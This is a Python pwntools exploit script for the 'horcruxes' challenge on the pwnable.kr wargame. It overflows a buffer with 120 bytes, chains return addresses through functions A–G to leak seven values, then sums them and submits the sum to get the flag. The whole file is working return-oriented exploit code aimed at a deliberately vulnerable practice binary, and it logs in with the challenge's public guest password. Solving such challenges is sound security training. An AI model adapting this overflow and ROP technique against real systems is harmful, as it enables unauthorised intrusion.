#!/usr/bin/env python
from pwn import *

#context.log_level='debug'

elf = ELF('./horcruxes')
payload = 'A' * 120
payload += p32(elf.sym.A)
payload += p32(elf.sym.B)
payload += p32(elf.sym.C)
payload += p32(elf.sym.D)
payload += p32(elf.sym.E)
payload += p32(elf.sym.F)
payload += p32(elf.sym.G)
payload += p32(0x0809fffc) # <+216>:	call   0x80a0009 <ropme>


shell = ssh('horcruxes', 'pwnable.kr', password='guest', port=2222)
p = shell.remote('localhost', 9032)
# p = process('./horcruxes')

p.sendlineafter('Menu:', '1')
p.sendlineafter('earned? : ', payload)

Sum = 0

for x in xrange(0,7):
	p.recvuntil('EXP +')
	Sum += int(p.recvuntil(')')[:-1])

p.sendlineafter('Menu:', '1')
p.sendlineafter('earned? : ', str(Sum))

print p.recv()